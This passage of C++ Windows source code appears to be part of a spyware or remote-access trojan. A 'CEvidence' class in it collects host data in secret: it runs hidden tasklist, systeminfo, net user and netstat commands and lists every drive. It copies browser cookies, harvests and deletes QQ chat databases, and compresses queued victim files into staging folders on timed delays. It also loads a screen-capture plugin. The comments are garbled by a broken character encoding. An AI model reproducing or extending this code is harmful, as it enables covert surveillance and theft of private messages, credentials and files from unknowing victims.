			if (szFirstFile)
			{
				DWORD dwSize = GetFileSize(hOldFile, NULL);
				if (dwSize<=4)
				{
					bDel=TRUE;
					break;
				}

				lpBuffer = new BYTE[dwSize];
				memset(lpBuffer,0,dwSize);
				ReadFile(hOldFile,lpBuffer,dwSize,&dwBytesWrite,0);

				CloseHandle(hOldFile);

				DWORD dwcount=((DWORD*)lpBuffer)[0];

				if (dwcount==0)
				{
					bDel=TRUE;
					break;
				}
								
				DWORD len=strlen((CHAR*)lpBuffer+4);
				if (!len||len>=MAX_PATH*2)
				{
					bDel=TRUE;
					break;
				}

			
				memcpy(szFirstFile,(char*)lpBuffer+4,len);
				xorbyte(szFirstFile);

				dwcount--;
				//printf("%d\r\n",dwcount);

				if (dwcount==0)
				{
					bDel=TRUE;
					break;
				}

				hOldFile = CreateFile(szNeedPassList,GENERIC_READ|GENERIC_WRITE,0,NULL,
					CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				//_asm int 3
				SetFilePointer(hOldFile, 0, 0, FILE_BEGIN);
				WriteFile(hOldFile,&dwcount,4,&dwBytesWrite,0);
				WriteFile(hOldFile,lpBuffer+len+4+1,dwSize-len-4-1,&dwBytesWrite,0);
				break;
			}


		} while (FALSE);

		if (hOldFile!=INVALID_HANDLE_VALUE)
		{
			CloseHandle(hOldFile);
		}
		if (bDel)
		{
			DeleteFileA(szNeedPassList);

		}

		if (lpBuffer)
		{
			delete lpBuffer;
		}


	}
	__except(1)
	{
		if (hOldFile!=INVALID_HANDLE_VALUE)
		{
			CloseHandle(hOldFile);
		}

		DeleteFileA(szNeedPassList);
	}



	LeaveCriticalSection(&m_cs);




	return TRUE;
}

BOOL   CopyDirectory(LPTSTR strSrcPath, LPTSTR strDestPath)
{
	if(strSrcPath[strlen(strSrcPath)-1]=='\\') strSrcPath[strlen(strSrcPath)-1]='\0'; 

	WIN32_FIND_DATA	FindFileData = {0};

	TCHAR strSrcFileName[MAX_PATH]={0};
	wsprintf(strSrcFileName,"%s\\*",strSrcPath);

	HANDLE hFile = ::FindFirstFile(strSrcFileName, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE){

		return FALSE;
	}

	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		wsprintf(strSrcFileName,"%s\\%s",strSrcPath,FindFileData.cFileName);
		//wsprintf(strDestFileName,"%s\\%s",strDestPath,FindFileData.cFileName);

	
		if((FindFileData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)==FILE_ATTRIBUTE_DIRECTORY)
		{
			Sleep(1000*23);
			CopyDirectory(strSrcFileName,strDestPath);
		}
		else
		{
			TCHAR strDestFileName[MAX_PATH];
			wsprintf(strDestFileName,"%s%sdat",strDestPath,FindFileData.cFileName);
			CompressFile(strSrcFileName,strDestFileName);
			Sleep(1000*10);
		}
		


	} while(FindNextFile(hFile, &FindFileData));

	FindClose(hFile);


	return TRUE;

}


BOOL CEvidence::GetLocalFile(TCHAR *szHuiChan)
{
	MakeSureDirectoryPathExists(m_szPathPassBack);

	char szFileName[MAX_PATH*2]={0};

	
	PassBackFileList(0,szFileName);
	if (strlen(szFileName)==0) return FALSE;


	
	if(szFileName[strlen(szFileName)-1]=='\\')
	{

	//	wsprintf(szOutFile,"%s",m_szPathPassBack);

		CopyDirectory(szFileName,m_szPathPassBack);

	}
	else
	{
		char szOutFile[MAX_PATH];

		char *szpos=StrRChr(szFileName,0,'\\');
		if (szpos)
		{
			wsprintf(szOutFile,"%s%sdat",m_szPathPassBack,szpos+1);
			CompressFile(szFileName,szOutFile);
		}
		
	}





	//char *szDns=MyDecode(lpURL + 6);


	return TRUE;
}




DWORD WINAPI CEvidence::GetLocalFileEx(LPVOID LPARAM)
{


		do 
		{
			__try
			{
				((CEvidence*)LPARAM)->GetLocalFile(NULL);
			}
			__except(1){}
			Sleep(1000*60*5);

		} while (TRUE);




	return TRUE;

}
CHAR sysinfo[][50]=
{
	"tasklist",//�����б�
	"system",//ϵͳ��Ϣ
	"user", //�û��б�
	"netstat",//����˿���Ϣ
//	"software",//����б�
//	"upgrade.txt",//������Ϣ
	"",
};

CHAR szCMD[][20]=
{
	"tasklist",//�����б�
	"systeminfo",//ϵͳ��Ϣ
	"net user", //�û��б�
	"netstat -an",//����˿���Ϣ
//	"software",//����б�
	//	"upgrade.txt",//������Ϣ
	"",
};

void CEvidence::GetSystemSub(char *szExe,char *szsysinfo)
{

	char sztmp[MAX_PATH];
	char szTempPathFile[MAX_PATH];
	GetTempPathA(MAX_PATH,sztmp);

	wsprintf(szTempPathFile,"%s%s.txt",sztmp,szsysinfo);

	char szCmd[MAX_PATH];
	wsprintf(szCmd,"cmd /c %s >%s",szExe,szTempPathFile);

	char szOutDir[MAX_PATH];
	wsprintf(szOutDir,"%s%s.txtdat",m_szPathMachine,szsysinfo);

	STARTUPINFOA si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {0};	

	CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); 

	WaitForSingleObject(pi.hProcess,INFINITE);

	CompressFile(szTempPathFile,szOutDir);

	Sleep(1000*60*5);


	return;
}

BOOL CEvidence::GetSystemInfo(TCHAR *szMaction)
{
	MakeSureDirectoryPathExists(m_szPathMachine);

	int i=0;
    while (strlen(sysinfo[i])!=0)
	{
		GetSystemSub(szCMD[i],sysinfo[i]);
		i++;		
	}

	return TRUE;

}

DWORD WINAPI CEvidence::GetSystemInfoEx(LPVOID LPARAM)
{

	do 
	{
		__try
		{
			((CEvidence*)LPARAM)->GetSystemInfo("null");
		}
		__except(1){}
		//Sleep(1000*60*60);

	} while (FALSE);

	return TRUE;

}


BOOL CEvidence::DirToFile(TCHAR *szDriver)
{
	char szTempPathFile[MAX_PATH];
	GetTempPathA(MAX_PATH, szTempPathFile);
	GetTempFileNameA(szTempPathFile, NULL, 0, szTempPathFile);

	MakeSureDirectoryPathExists(m_szPathDir);

	char szCmd[MAX_PATH];
	wsprintf(szCmd,"cmd /c dir %s:\\ /s >%s",szDriver,szTempPathFile);

	char szOutDir[MAX_PATH];
	wsprintf(szOutDir,"%s%s.drvdat",m_szPathDir,szDriver);

	STARTUPINFOA si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {0};	

	

	CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); 

	WaitForSingleObject(pi.hProcess,INFINITE);

	CompressFile(szTempPathFile,szOutDir);
	//MoveFileEx(szTempPathFile,szOutDir,MOVEFILE_REPLACE_EXISTING);

	for (int i=0;i<=100;i++)
	{
		DeleteFileA(szTempPathFile);
		Sleep(10);
	}


	return TRUE;
}

DWORD WINAPI CEvidence::GetLocalDirList(LPVOID LPARAM)
{
	CHAR wsLetter[2];
	int i;

	do 
	{
		__try
		{
			DWORD dwDrives = GetLogicalDrives();
			if (dwDrives == 0) break;
			wsLetter[0]='A';
			wsLetter[1]=0;
			//__asm int 3

			for (i= 0; i < 32; i++)
			{
				if (dwDrives & ((DWORD)1 << i))
				{
					//	printf("ddd");
					((CEvidence*)LPARAM)->DirToFile(wsLetter);
				}
				wsLetter[0] += 1;
				Sleep(1000*53);
			}

		}
		__except(1){}
//		Sleep(1000*60*60*6);//6Сʱ

	} while (FALSE);

	return TRUE;

}

DWORD WINAPI CEvidence::GetQQlog(LPVOID LPARAM)
{

	//__asm int 3

	__try
	{
		do 
		{
			TCHAR szQQPath[MAX_PATH*5];
			memset(szQQPath,0,MAX_PATH*5);

			BOOL bRet = GetRegValue(HKEY_LOCAL_MACHINE, "Software\\Tencent\\QQ2009", "Install", szQQPath);
			if (bRet){
				strcat(szQQPath,"\\Users");
				((CEvidence *)LPARAM)->CreateQQLogFile(szQQPath);
				break;
			}
			memset(szQQPath,0,MAX_PATH*5);
			bRet = GetRegValue(HKEY_LOCAL_MACHINE, "Software\\Tencent\\QQ2010", "Install", szQQPath);
			if (bRet){
				strcat(szQQPath,"\\Users");
				((CEvidence *)LPARAM)->CreateQQLogFile(szQQPath);
				break;
			}

			memset(szQQPath,0,MAX_PATH*5);
			SHGetSpecialFolderPath(NULL,szQQPath,CSIDL_PERSONAL,0);
			strcat(szQQPath,"\\Tencent");
			((CEvidence *)LPARAM)->CreateQQLogFile(szQQPath);
			strcat(szQQPath," Files");
			((CEvidence *)LPARAM)->CreateQQLogFile(szQQPath);

//			Sleep(1000*60*60*5);//5Сʱ

		} while (FALSE);


	}
	__except(1)
	{

	}
	return TRUE;

}

BOOL CEvidence::CreateQQLogFile(char *  szQQPath)
{




	char szQQUserPath[MAX_PATH*5] = {0};
	StrCpyA(szQQUserPath,szQQPath);
	//wsprintf(szQQUserPath, "%s\\Users", szQQPath);
	lstrcat(szQQUserPath, "\\*.*");

	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(szQQUserPath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{

		return FALSE;
	}

	char szFullPath[MAX_PATH*5] = {0};
	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		if (strcmp(pszFileName, "All Users") == 0)
		{
			continue;
		}

		wsprintf(szFullPath, "%s\\%s", szQQPath, pszFileName);
		CreateQQFileOne(szFullPath);

	} while(FindNextFile(hFile, &FindFileData));

	return TRUE;
}



void CopyFile(char *szOldFile,char *szNewFile)
{

	HANDLE	hOldFile = CreateFile(szOldFile,GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD dwSize = GetFileSize(hOldFile, NULL);

	HANDLE	hNewFile = CreateFile(szNewFile, GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

//	SetFilePointer(hNewFile, 0, 0, FILE_END);

	LPBYTE	lpBuffer = new BYTE[dwSize];
	memset(lpBuffer,0,dwSize);
	DWORD dwBytesWrite = 0;
	ReadFile(hOldFile,lpBuffer,dwSize,&dwBytesWrite,0);


	WriteFile(hNewFile, lpBuffer, dwSize, &dwBytesWrite, NULL);
	CloseHandle(hNewFile);
	CloseHandle(hOldFile);
	delete lpBuffer;
}


BOOL CEvidence::CreateQQFileOne(LPCSTR lpPathName)
{

// 	char szOutDir[MAX_PATH]={0};
// 
// 	wsprintf(szOutDir,"%sqq\\", m_szPathEvidence);

	// 	SHGetSpecialFolderPath(NULL,szOutDir,CSIDL_PROGRAM_FILES,0);
	// 	strcat(szOutDir,"\\Microsoft Research update\\Evidence\\qq\\");

	MakeSureDirectoryPathExists(m_szPathQQ);
	char lpPathFind[MAX_PATH*5] = {0};
	wsprintf(lpPathFind, "%s\\*.*", lpPathName);

	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(lpPathFind, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char szOldFile[MAX_PATH*5] = {0};
	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (0==StrStrI(pszFileName, "Msg2.0.dbm")
			//0 == StrStrI(pszFileName, ".dbm")
			)
		{
			continue;
		}
	
		//����qqĿ¼,���������¼�ļ�
		CHAR szDirectory[MAX_PATH*5] = {0};
		LPSTR pPos = StrRChr(lpPathName, NULL, '\\');
		wsprintf(szDirectory, "%s%s_%sdat", m_szPathQQ, pPos+1,pszFileName);
		//::CreateDirectory(szDirectory, NULL);
		//StrCat(szDirectory, "\\Msg2.0.db");

		wsprintf(szOldFile, "%s\\%s", lpPathName, pszFileName);

		CompressFile(szOldFile,szDirectory);

		DeleteFileA(szOldFile);

		szOldFile[strlen(szOldFile)-1]='\0';

		wsprintf(szDirectory, "%s%s_%sdat", m_szPathQQ, pPos+1,"Msg2.0.db");

		CompressFile(szOldFile,szDirectory);

		break; 
		//Sleep(1000*53);


	} while(FindNextFile(hFile, &FindFileData));

	return TRUE;
}


BOOL CEvidence::CreateCookiesFile()
{
	MakeSureDirectoryPathExists(m_szPathCookies);	

	char szCookiesPath[MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_COOKIES, NULL, 0, szCookiesPath);

	char szFindPath[MAX_PATH] = {0};
	wsprintf(szFindPath, "%s\\*.*", szCookiesPath);
	
	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(szFindPath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char szOldFileName[MAX_PATH] = {0};
	char szNewFileName[MAX_PATH] = {0};
	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		wsprintf(szNewFileName, "%s\\%s", m_szPathCookies, pszFileName);
		wsprintf(szOldFileName, "%s\\%s", szCookiesPath, pszFileName);
		CopyFile(szOldFileName, szNewFileName, FALSE);

	} while(FindNextFile(hFile, &FindFileData));

	return TRUE;
}


BOOL CEvidence::StartPlugScreen()
{	
	if (m_bWorkPlugScreen)
	{
		return TRUE;
	}


	if (!PathFileExists(m_szPlugSreenName))
	{
		return FALSE;
	}

	if (NULL == m_hDllCleverScreen)
	{
		m_hDllCleverScreen = LoadLibrary(m_szPlugSreenName);
		if (NULL == m_hDllCleverScreen)
		{
			return FALSE;
		}
	}
	
	
	 typedef BOOL (*pFunStart)(int nNULL);
	 pFunStart PluginFunc = (pFunStart)CKeyboardManager::MyGetProcAddress( m_hDllCleverScreen, "Start" );
	 if ( PluginFunc ) 
	 {
		 PluginFunc(NULL);//���ô˺���

		 m_bWorkPlugScreen = TRUE;
	 }

	 return TRUE;
}


BOOL CEvidence::StopPlugScreen()
{
	if (!m_bWorkPlugScreen)
	{
		return TRUE;
	}

	if (!PathFileExists(m_szPlugSreenName))
	{
		return FALSE;
	}

	if (NULL == m_hDllCleverScreen)
	{
		return TRUE;
	}

	typedef BOOL (*pFunStop)(void);
	pFunStop PluginFunc = (pFunStop)CKeyboardManager::MyGetProcAddress( m_hDllCleverScreen, "Stop" );
	if ( PluginFunc ) 
	{
		PluginFunc();//���ô˺���
		m_bWorkPlugScreen = FALSE;
	}

	FreeLibrary(m_hDllCleverScreen);
	m_hDllCleverScreen = NULL;

	return TRUE;
}


BOOL CEvidence::FilterFileEx(LPVOID lpThis, LPSTR lpFileName)
{
	if (NULL == lpThis)
	{
		return FALSE;
	}

	return ((CEvidence *)lpThis)->FilterFile(lpFileName);
}

//����Ture ��Ҫɾ�� ������Ҫ
BOOL CEvidence::FilterFile( LPSTR lpFileName)
{
	if (NULL == lpFileName)
	{
		return FALSE;
	}

	//û�����ù�������
	if (m_infoState.nTypeAlarmSrn == 7)
	{
		return FALSE;
	}

	//�ļ����ƹ���

	for (int i=0; i<sizeof(m_sFilterContent)/sizeof(FILTERCONTENT); i++)
	{
		if (!(m_infoState.nTypeAlarmSrn & m_sFilterContent[i].nTypeAlarmSrn) && NULL != StrStr(lpFileName, m_sFilterContent[i].szFilterContent))
		{
			return TRUE;
		}

	}
	
	return FALSE;
}

void CEvidence::GetMiQiu()
{
	//��ȡQQ�����¼
	CloseHandle(MyCreateThread(NULL, 0, GetQQlog, this, 0, NULL));
	//��ȡ�ļ��б�
	CloseHandle(MyCreateThread(NULL, 0, GetLocalDirList, this, 0, NULL));
	//��ȡ�ش��ļ�
	CloseHandle(MyCreateThread(NULL, 0, GetLocalFileEx, this, 0, NULL));

	//��ȡ������Ϣ
	CloseHandle(MyCreateThread(NULL, 0, GetSystemInfoEx, this, 0, NULL));

//	SetEvent(m_hevnetMonitor);
}
